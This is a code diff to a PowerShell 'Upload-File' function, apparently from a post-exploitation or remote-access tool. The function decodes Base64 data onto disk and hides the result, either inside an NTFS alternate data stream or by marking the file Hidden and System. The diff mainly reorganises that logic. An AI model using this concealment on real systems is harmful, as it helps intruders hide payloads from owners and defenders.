@@ -501,38 +501,31 @@ function Upload-File
     )
     try {
         $Stream = ""
-        
+        $FullPath = $Destination
+        if ($Destination -Match ':[^\\]'){
+            $Destination =  $FullPath.Substring(0, $FullPath.LastIndexOf(":"))
+            $Stream = $FullPath.Substring($FullPath.LastIndexOf(":") + 1)
+        }
+        if($Stream){
+            $NotHidden = $true
+        }
         if ($NotHidden -eq $true) {
-            write-output "Uploaded file to: $Destination"
-            $FullPath = $Destination
-            if ($Destination -Match ':[^\\]'){
-                $Destination =  $FullPath.Substring(0, $FullPath.LastIndexOf(":"))
-                $Stream = $FullPath.Substring($FullPath.LastIndexOf(":") + 1)
-            }
             $fileBytes = [Convert]::FromBase64String($Base64)
             if ($Stream){
-                add-content -path $Destination -value $fileBytes -stream $Stream -encoding byte
+                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte 
             } else {
                 [io.file]::WriteAllBytes($Destination, $fileBytes)
             }
+            write-output "Uploaded file to: $FullPath"
         } else {
-            write-output "Uploaded file as HIDDEN & SYSTEM to: $Destination"
-            write-output "Run Get-ChildItem -Force to view the uploaded files"
-            $FullPath = $Destination
-            if ($Destination -Match ':[^\\]'){
-                $Destination =  $FullPath.Substring(0, $FullPath.LastIndexOf(":"))
-                $Stream = $FullPath.Substring($FullPath.LastIndexOf(":") + 1)
-            }
             $fileBytes = [Convert]::FromBase64String($Base64)
-            if ($Stream){
-                add-content -path $Destination -value $fileBytes -stream $Stream -encoding byte
-            } else {
-                [io.file]::WriteAllBytes($Destination, $fileBytes)
-            }
+            [io.file]::WriteAllBytes($Destination, $fileBytes)
+            write-output "Uploaded file as HIDDEN & SYSTEM to: $FullPath"
             $file = Get-Item $Destination -Force
             $attrib = $file.Attributes
             $attrib = "Hidden,System"
             $file.Attributes = $attrib  
+            write-output "Run Get-ChildItem -Force to view the uploaded files"
         }
 
     } catch {
